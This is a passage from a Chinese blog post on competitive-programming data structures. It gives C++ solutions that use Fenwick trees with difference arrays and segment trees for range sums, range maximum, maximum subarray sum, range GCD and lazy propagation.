i=x;i;i-=<span class="built_in">lowbit</span>(i))res+=tr[i];</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="built_in">add</span>(i,a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="type">int</span> tag,l,r,c;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;tag);</span><br><span class="line">        <span class="keyword">if</span>(tag==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;l,&amp;r,&amp;c);</span><br><span class="line">            <span class="built_in">add</span>(l,c),<span class="built_in">add</span>(r+<span class="number">1</span>,-c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;c);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">sum</span>(c));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="区间修改-区间查询"><a href="#区间修改-区间查询" class="headerlink" title="区间修改+区间查询"></a><a href="https://www.luogu.com.cn/problem/P3372">区间修改+区间查询</a></h3><p>用两个差分数组(b[i]和i<em>b[i])来维护区间的修改和查询前缀和(原数组是a[N]),每次只用改四个点,查询则是用下列公式:<br>$$<br>\sum_{1}^{n}a[i]&#x3D;\sum_{1}^{n}b[i]</em>(n+1)-\sum_{1}^{n}(i*b[i])<br>$$<br>便可AC洛谷上的一道线段树模版题</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">2e5</span>+<span class="number">10</span>;</span><br><span class="line">ll tr1[N],tr2[N];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line">ll a[N];</span><br><span class="line">ll l,r;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">sum</span><span class="params">(ll tr[],<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">   ll res=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=x;i&gt;<span class="number">0</span>;i-=<span class="built_in">lowbit</span>(i))res+=tr[i];</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">p_sum</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(tr1,r)*(r+<span class="number">1</span>)-<span class="built_in">sum</span>(tr2,r)-<span class="built_in">sum</span>(tr1,l<span class="number">-1</span>)*l+<span class="built_in">sum</span>(tr2,l<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(ll tr[],<span class="type">int</span> x,ll c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=x;i&lt;=n;i+=<span class="built_in">lowbit</span>(i))tr[i]+=c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="built_in">add</span>(tr1,i,a[i]-a[i<span class="number">-1</span>]),<span class="built_in">add</span>(tr2,i,(ll)i*(a[i]-a[i<span class="number">-1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">       <span class="type">int</span> tag;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;tag);</span><br><span class="line">    <span class="keyword">if</span>(tag==<span class="number">1</span>)&#123;</span><br><span class="line">        ll c;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld&quot;</span>,&amp;l,&amp;r,&amp;c);</span><br><span class="line">        <span class="built_in">add</span>(tr1,l,c),<span class="built_in">add</span>(tr1,r+<span class="number">1</span>,-c),<span class="built_in">add</span>(tr2,l,l*c),<span class="built_in">add</span>(tr2,r+<span class="number">1</span>,(r+<span class="number">1</span>)*-c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tag==<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">p_sum</span>(l,r));</span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h2><h3 id="初识线段树"><a href="#初识线段树" class="headerlink" title="初识线段树"></a>初识线段树</h3><blockquote>
<p>代码量巨大</p>
</blockquote>
<p>基本操作实现</p>
<ul>
<li>pushup()</li>
<li>build():生成线段树</li>
<li>modify()<ul>
<li>修改单点(从上往下递归)</li>
<li>修改区间,使用pushdown操作(懒标记)</li>
</ul>
</li>
<li>query():查询某一段区间信息</li>
</ul>
<p>原理:接近满二叉树,区间折半分,每一个父节点有两个子节点(除了最后一层),此类似于堆,故用一维数组来存整一棵树</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111928073.png" alt="image-20240208122807873" style="zoom:50%;" />

<p>类似于这样,将一个根区间折半依次向下递归划分,query的时间复杂度接近(4logn)</p>
<p>空间最大接近4n,故要开四倍空间</p>
<h4 id="修改单点值-动态查询区间最大值"><a href="#修改单点值-动态查询区间最大值" class="headerlink" title="修改单点值+动态查询区间最大值"></a><a href="https://www.luogu.com.cn/problem/P1198">修改单点值+动态查询区间最大值</a></h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">2e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> m,n,p,last;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r;</span><br><span class="line">    <span class="type">int</span> v;</span><br><span class="line">&#125;tr[<span class="number">4</span>*N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    tr[u].v=<span class="built_in">max</span>(tr[u&lt;&lt;<span class="number">1</span>].v,tr[u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].v);<span class="comment">//更新父节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;<span class="comment">//初始化这一颗树</span></span><br><span class="line">    tr[u].l=l;</span><br><span class="line">    tr[u].r=r;</span><br><span class="line">    tr[u]=&#123;l,r&#125;;<span class="comment">//为什么这个在vscode里面会报错</span></span><br><span class="line">    <span class="keyword">if</span>(l==r)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">    <span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;<span class="comment">//查询队列</span></span><br><span class="line">    <span class="keyword">if</span>(tr[u].l&gt;=l&amp;&amp;tr[u].r&lt;=r)<span class="keyword">return</span> tr[u].v;</span><br><span class="line">    <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> v=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=mid)v=<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">if</span>(r&gt;mid)v=<span class="built_in">max</span>(v,<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r));<span class="comment">//其实感觉这里你把区间划分了也是能过的</span></span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> x,<span class="type">int</span> v)</span></span>&#123;<span class="comment">//修改单点</span></span><br><span class="line">    <span class="keyword">if</span>(tr[u].l==x&amp;&amp;tr[u].r==x)tr[u].v=v;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>,x,v);</span><br><span class="line">        <span class="keyword">if</span>(x&gt;mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,x,v);</span><br><span class="line">        <span class="built_in">pushup</span>(u);<span class="comment">//把当前儿子的最大值信息回溯以下,更新他的父节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;m,&amp;p);</span><br><span class="line">  <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,m);</span><br><span class="line">  <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">    <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">    ll x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%lld&quot;</span>,op,&amp;x);</span><br><span class="line">    <span class="keyword">if</span>(*op==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">       last= <span class="built_in">query</span>(<span class="number">1</span>,n-x+<span class="number">1</span>,n);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,last);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        x=(x+last)%p;</span><br><span class="line">        <span class="built_in">modify</span>(<span class="number">1</span>,n+<span class="number">1</span>,x);</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h4 id="单点修改-区间最大连续和"><a href="#单点修改-区间最大连续和" class="headerlink" title="单点修改+区间最大连续和"></a><a href="https://www.luogu.com.cn/problem/P4513">单点修改+区间最大连续和</a></h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//维护区间范围内的连续得分最大值</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    <span class="type">int</span> sum, lmax, rmax, tmax;</span><br><span class="line">&#125; tr[<span class="number">4</span> * N];</span><br><span class="line"><span class="type">int</span> w[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(node &amp;u, node &amp;l, node &amp;r)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 负责更新父节点</span></span><br><span class="line">    u.sum = l.sum + r.sum;<span class="comment">//更新总和</span></span><br><span class="line">    u.lmax = <span class="built_in">max</span>(l.lmax, l.sum + r.lmax);<span class="comment">//更新父节点的左最大值</span></span><br><span class="line">    u.rmax = <span class="built_in">max</span>(r.rmax, r.sum + l.rmax);<span class="comment">//更新父节点的右最大值</span></span><br><span class="line">    u.tmax = <span class="built_in">max</span>(l.tmax, <span class="built_in">max</span>(r.tmax, l.rmax + r.lmax));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 函数重载</span></span><br><span class="line">    <span class="built_in">pushup</span>(tr[u], tr[u &lt;&lt; <span class="number">1</span>], tr[u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r)</span><br><span class="line">    &#123;</span><br><span class="line">        tr[u] = &#123;l, r, w[r], w[r], w[r], w[r]&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        tr[u] = &#123;l, r&#125;;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(u &lt;&lt; <span class="number">1</span>, l, mid), <span class="built_in">build</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, mid + <span class="number">1</span>, r);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> x, <span class="type">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tr[u].l == x &amp;&amp; tr[u].r == x)</span><br><span class="line">        tr[u].lmax = v, tr[u].rmax = v, tr[u].sum = v, tr[u].tmax = v;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = tr[u].l + tr[u].r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (x &lt;= mid)</span><br><span class="line">            <span class="built_in">modify</span>(u &lt;&lt; <span class="number">1</span>, x, v);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">modify</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, x, v);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">node <span class="title">query</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tr[u].l &gt;= l &amp;&amp; tr[u].r &lt;= r)</span><br><span class="line">        <span class="keyword">return</span> tr[u];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = tr[u].l + tr[u].r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (r &lt;= mid)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span>, l, r);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l &gt; mid)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, l, r);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">auto</span> left = <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span>, l, r);</span><br><span class="line">            <span class="keyword">auto</span> right = <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, l, r);</span><br><span class="line">            node res;</span><br><span class="line">            <span class="built_in">pushup</span>(res, left, right);</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;w[i]);</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>, <span class="number">1</span>, n);</span><br><span class="line">    <span class="type">int</span> k, x, y;</span><br><span class="line">    <span class="keyword">while</span> (m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;k, &amp;x, &amp;y);</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (x &gt; y)</span><br><span class="line">                <span class="built_in">swap</span>(x, y);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">query</span>(<span class="number">1</span>, x, y).tmax);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">modify</span>(<span class="number">1</span>, x, y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="区间修改-区间最大公约数"><a href="#区间修改-区间最大公约数" class="headerlink" title="区间修改+区间最大公约数"></a><a href="https://www.acwing.com/problem/content/247/">区间修改+区间最大公约数</a></h4><p>思路:转化成差分数组</p>
<p>gcd(a,b,c)&#x3D;gcd(a,b-a,c-b);故每次我们把第l+1到r的差分最大公约数与1到l的差分前缀和取一个gcd就能得到答案所求</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">5e5</span>+<span class="number">10</span>;</span><br><span class="line">LL w[N];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r;</span><br><span class="line">    LL  sum,d;</span><br><span class="line">&#125;tr[<span class="number">4</span>*N];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="function">LL <span class="title">gcd</span><span class="params">(LL a,LL b)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> b?<span class="built_in">gcd</span>(b,a%b): a;<span class="comment">//可能求出来负数,需要加一个abs取绝对值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(node &amp;u,node &amp;l,node &amp;r)</span></span>&#123;</span><br><span class="line">    u.sum=l.sum+r.sum;</span><br><span class="line">    u.d=<span class="built_in">gcd</span>(l.d,r.d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="built_in">pushup</span>(tr[u],tr[u&lt;&lt;<span class="number">1</span>],tr[u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        LL b=w[l]-w[l<span class="number">-1</span>];</span><br><span class="line">        tr[u]=&#123;l,r,b,b&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        tr[u]=&#123;l,r&#125;;</span><br><span class="line">        <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>,l,mid),<span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> x,LL v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(tr[u].l==x&amp;&amp;tr[u].r==x)&#123;</span><br><span class="line">        LL b=tr[u].sum+v;</span><br><span class="line">        tr[u]=&#123;x,x,b,b&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>,x,v);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,x,v);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">node <span class="title">query</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;r)<span class="keyword">return</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(tr[u].l&gt;=l&amp;&amp;tr[u].r&lt;=r)<span class="keyword">return</span> tr[u];</span><br><span class="line">    <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid)<span class="keyword">return</span> <span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>,l,r); </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid)  <span class="keyword">return</span>  <span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">auto</span> left=<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>,l,r),right=<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r);</span><br><span class="line">        node res;</span><br><span class="line">        <span class="built_in">pushup</span>(res,left,right);</span><br><span class="line">        <span class="keyword">return</span> res; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;w[i]);</span><br><span class="line">   <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">   <span class="type">int</span> l,r;</span><br><span class="line">   LL d;</span><br><span class="line">   <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">   <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">       <span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d&quot;</span>,op,&amp;l,&amp;r);</span><br><span class="line">   <span class="keyword">if</span>(*op==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">auto</span> left=<span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,l),right=<span class="built_in">query</span>(<span class="number">1</span>,l+<span class="number">1</span>,r);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">abs</span>(<span class="built_in">gcd</span>(left.sum,right.d)));</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;d);</span><br><span class="line">    <span class="built_in">modify</span>(<span class="number">1</span>,l,d);</span><br><span class="line">    <span class="keyword">if</span>(r+<span class="number">1</span>&lt;=n)<span class="built_in">modify</span>(<span class="number">1</span>,r+<span class="number">1</span>,-d);</span><br><span class="line">   &#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="入门线段树"><a href="#入门线段树" class="headerlink" title="入门线段树"></a>入门线段树</h3><h4 id="懒标记"><a href="#懒标记" class="headerlink" title="懒标记"></a><a href="https://www.luogu.com.cn/problem/P3373">懒标记</a></h4><p>pushdown操作专门运用区间修改</p>
<p>信息:</p>
<ol>
<li><p>sum表示只考虑当前节点和子节点上的所有标记,当前区间的总和</p>
</li>
<li><p>add为懒标记,表示给当前区间的所有数字同时加上一个add</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n,q,m=<span class="number">571373</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r;</span><br><span class="line">    ll sum,add,mul;</span><br><span class="line">&#125;tr[<span class="number">4</span>*N];</span><br><span class="line">ll w[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(node &amp;t,ll add,ll mul)</span></span>&#123;<span class="comment">//在这里负责执行sum,mul,add的更新操作,每次执行先乘后加的顺序即sum*mul+add</span></span><br><span class="line">    t.sum=(ll)(t.sum*mul+(t.r-t.l+<span class="number">1</span>)*add)%m;</span><br><span class="line">    t.mul=(t.mul*mul)%m;</span><br><span class="line">    t.add=(t.add*mul+add)%m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    tr[u].sum=(tr[u&lt;&lt;<span class="number">1</span>].sum+tr[u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum)%m;<span 